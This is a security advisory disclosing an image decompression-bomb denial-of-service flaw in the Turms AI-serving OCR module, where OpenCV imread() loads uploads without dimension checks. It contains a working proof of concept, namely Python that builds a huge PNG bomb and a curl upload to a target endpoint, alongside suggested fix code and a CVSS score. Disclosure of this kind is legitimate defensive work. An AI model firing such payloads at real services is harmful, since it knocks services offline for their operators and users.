# Turms AI-Serving - Image Decompression Bomb Denial of Service Vulnerability

## NAME OF AFFECTED PRODUCT(S)

- **Product**: Turms AI-Serving Module (OCR Service)
- **Vendor Homepage**: https://github.com/turms-im/turms

## AFFECTED AND/OR FIXED VERSION(S)

- **Submitter**: s1ain
- **Affected Version(s)**: Turms v0.10.0-SNAPSHOT and earlier versions
- **Software Link**: https://github.com/turms-im/turms
- **Fixed Version**: Not fixed yet

## PROBLEM TYPE

- **Vulnerability Type**: CWE-409: Improper Handling of Highly Compressed Data (Data Amplification) / CWE-770: Allocation of Resources Without Limits or Throttling
- **Root Cause**: The `ExtendedOpenCVImage` class loads images using OpenCV's `imread()` function without validating image dimensions or pixel count. Attackers can upload specially crafted compressed images that expand to gigabytes of memory when decompressed.
- **Impact**:
  - Memory exhaustion causing service crash (Denial of Service)
  - Out of Memory (OOM) errors affecting the entire AI-serving module
  - Potential impact on co-located services on the same server
  - Multi-request amplification attack can make the service completely unavailable

## DESCRIPTION

A critical denial of service vulnerability exists in Turms AI-serving module's image processing functionality. The OCR service accepts uploaded images without validating their decompressed size. The `ExtendedOpenCVImage` class uses OpenCV's `Imgcodecs.imread()` to load images directly into memory without checking dimensions or pixel count. An attacker can craft a malicious image file (PNG, JPEG, etc.) that is small when compressed (~10MB) but expands to gigabytes (up to 16GB+) when loaded into memory, causing immediate memory exhaustion and service failure.

## Code Analysis

**Vulnerable Location**: `turms-ai-serving/src/main/java/ai/djl/opencv/ExtendedOpenCVImage.java:36`

**Vulnerable Code**:
```java
public ExtendedOpenCVImage(String imagePath) {
    super(read(imagePath));
}

private static Mat read(String imagePath) {
    Mat mat = Imgcodecs.imread(imagePath);  // ← No size validation!
    if (mat.empty()) {
        throw new RuntimeException(
                "Failed to read from the path: "
                        + imagePath);
    }
    return mat;  // ← Returns potentially gigantic Mat object
}
```

**Vulnerable Endpoint**: OCR Controller that processes uploaded images
- Location: `turms-ai-serving/src/main/java/im/turms/ai/domain/ocr/controller/OcrController.java`

## Authentication Requirements

The vulnerability can be exploited by unauthenticated attackers if the OCR service is publicly accessible, or by any authenticated user if authentication is required. The exact authentication requirements depend on the deployment configuration.

## Vulnerability Details and POC

**Vulnerability Type**: Denial of Service - Image Decompression Bomb

**Vulnerability Location**:
- File: `turms-ai-serving/src/main/java/ai/djl/opencv/ExtendedOpenCVImage.java`
- Method: `read(String imagePath)`
- Line: 37

**Proof of Concept**:

**Step 1: Create a decompression bomb image**
```python
from PIL import Image
import io

# Create a 65535x65535 white image (maximum for PNG)
# Compressed: ~10-20 MB
# Decompressed in memory: ~12.9 GB (65535 * 65535 * 3 bytes RGB)
width = 65535
height = 65535

img = Image.new('RGB', (width, height), color='white')

# Save with maximum compression
img.save('bomb.png', optimize=True, compress_level=9)

print(f"Image dimensions: {width}x{height}")
print(f"Pixels: {width * height:,}")
print(f"Estimated memory: {(width * height * 3) / (1024**3):.2f} GB")
```

**Step 2: Upload the malicious image**
```bash
# Upload to OCR endpoint
curl -X POST http://target-server:8080/ocr \
  -H "Content-Type: multipart/form-data" \
  -F "file=@bomb.png"

# Server will attempt to load entire 12.9GB image into memory
# Result: OutOfMemoryError and service crash
```

**Alternative smaller payload (for testing)**:
```python
# More moderate bomb for testing: 32768x32768
# Compressed: ~5 MB, Decompressed: ~3.2 GB
img = Image.new('RGB', (32768, 32768), color='white')
img.save('moderate_bomb.png', optimize=True, compress_level=9)
```

## Attack Results

Successful exploitation results in:
- Immediate memory exhaustion on the AI-serving module
- Java OutOfMemoryError crash
- Service becomes unavailable until manual restart
- Potential cascade failure if multiple instances share resources
- Resource starvation for other services on the same server

**Attack Amplification**:
- 10 MB upload → 12.9 GB memory consumption (1,290x amplification)
- Multiple concurrent requests can completely exhaust system resources
- No rate limiting or size validation to prevent abuse

## Suggested Repair

1. **Implement strict dimension and pixel count validation** (Primary fix):
```java
private static final int MAX_IMAGE_PIXELS = 25_000_000; // 25 megapixels (e.g., 5000x5000)
private static final int MAX_IMAGE_DIMENSION = 10000;   // Maximum width or height

private static Mat read(String imagePath) {
    Mat mat = Imgcodecs.imread(imagePath);
    if (mat.empty()) {
        throw new RuntimeException("Failed to read image");
    }

    // Validate dimensions
    int width = mat.width();
    int height = mat.height();

    if (width > MAX_IMAGE_DIMENSION || height > MAX_IMAGE_DIMENSION) {
        mat.release();  // Free memory before throwing
        throw new IllegalArgumentException(
            String.format("Image dimensions too large: %dx%d (max: %d)",
                width, height, MAX_IMAGE_DIMENSION)
        );
    }

    // Validate total pixel count
    long totalPixels = (long) width * height;
    if (totalPixels > MAX_IMAGE_PIXELS) {
        mat.release();
        throw new IllegalArgumentException(
            String.format("Image has too many pixels: %d (max: %d)",
                totalPixels, MAX_IMAGE_PIXELS)
        );
    }

    return mat;
}
```

2. **Add file size validation before processing**:
```java
private static final long MAX_FILE_SIZE = 10 * 1024 * 1024; // 10 MB

public void validateFileSize(File file) {
    if (file.length() > MAX_FILE_SIZE) {
        throw new IllegalArgumentException("File too large");
    }
}
```

3. **Implement rate limiting** on OCR endpoint to prevent rapid successive attacks

4. **Add resource monitoring and circuit breaker** to detect and stop memory exhaustion attacks

5. **Configure JVM memory limits** and implement proper error handling for OOM conditions

6. **Security testing** with various image bombs to verify protections

## CVSS Score

**CVSS v3.1**: 7.5 (High)
- Attack Vector (AV): Network
- Attack Complexity (AC): Low
- Privileges Required (PR): None
- User Interaction (UI): None
- Scope (S): Unchanged
- Confidentiality (C): None
- Integrity (I): None
- Availability (A): High

**Vector String**: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H

## References

- CWE-409: Improper Handling of Highly Compressed Data (Data Amplification)
- CWE-770: Allocation of Resources Without Limits or Throttling
- OWASP: Denial of Service (DoS) Attacks
- "PNG Bomb" and "Decompression Bomb" attack techniques
